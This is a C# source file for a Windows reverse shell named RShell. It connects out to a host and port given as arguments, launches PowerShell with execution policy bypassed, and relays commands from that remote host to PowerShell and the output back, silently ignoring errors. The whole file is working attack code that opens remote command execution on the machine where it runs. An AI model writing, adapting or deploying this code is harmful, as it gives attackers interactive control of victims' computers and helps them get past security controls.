using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Programm
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it
        static void Main(string[] args)
        {
            //Check for correct number of arguments
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP_ADDRESS> <PORT>");
                return;
            }
            try
            {
                //Connect to the specified IP and port
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                //Set up input and output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                //Define a hidden Powersehll (-ep bypass -nologo) process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardError = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataRecieved);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataRecieved);

                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re Route user-input to STDIN of the powershell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (userInput != "exit")
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for Powershell to exit (based on user input) and then close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception)
            {
                
            }
        }
        private static void HandleDataRecieved(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }    
    }
}
}